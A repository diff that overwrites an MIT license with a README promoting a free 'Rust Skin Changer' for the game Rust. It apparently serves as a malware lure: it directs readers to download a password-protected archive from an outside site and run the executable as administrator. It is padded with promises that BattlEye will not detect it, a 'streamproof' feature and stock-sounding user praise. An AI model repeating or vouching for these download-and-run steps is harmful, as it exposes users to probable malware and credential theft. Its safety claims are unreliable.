@@ -1,21 +1,48 @@
-MIT License
+RUST SKIN CHANGER 2026 🔥🎯
 
-Copyright (c) 2026 wragglamb6
+Client-side cosmetic changer for Rust  
+Swap weapon skins, clothing, hats, masks, deployables & building blocks — visual only
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+Features
+- Instant weapon skin swaps: AK-47, LR-300, M39, Custom SMG, bolt-action rifle and more
+- Clothing & armor changer: hazmat suit, metal facemask, road sign jacket, bandana
+- Hat & mask swap: bandana, burlap headwrap, riot helmet, wolf headdress skins
+- Deployable skins: sleeping bag, storage box, furnace, workbench tiers
+- Building block skins: wood, stone, metal, HQM walls/doors/floors
+- Preview mode: 3D item/clothing view with lighting
+- Randomizer: auto-random skins per wipe or session
+- Favorites: save and load your custom cosmetic sets
+- Streamproof: hides visuals from OBS, recordings, screenshots
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+How it works (client-side only)
+- Changes are local to your screen — nothing sent to servers
+- BattlEye does not detect cosmetic modifications
+- No real item ownership or value changes — purely visual
+- Compatible with current Rust version (February 2026)
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+How to use
+1. Download from https://getcore.cc/
+2. Extract archive (password: 1125)
+3. Run .exe as administrator
+4. Launch Rust
+5. Press Insert to open menu
+6. Choose and apply cosmetics — raid in style
+
+Supported
+- Windows 10/11 (64-bit)
+- Latest Rust (Steam / Facepunch)
+
+User feedback (February 2026)
+"Gold AK + road sign jacket every wipe — stacked look"
+"Randomizer makes fresh wipes exciting"
+"Preview mode great for testing rare skins"
+"Streamproof perfect for Twitch raids"
+
+FAQ
+Detected? No — client-side visuals only, BattlEye ignores cosmetics.
+Menu key? Insert (toggle on/off).
+Updates? Grab fresh version from https://getcore.cc/ for new skins & monthly updates.
+Help? Open issue or star the repo ⭐
+
+RUST SKIN CHANGER 2026 • Full drip without scrap 🔥  
+Look geared on wipe day, brothers!
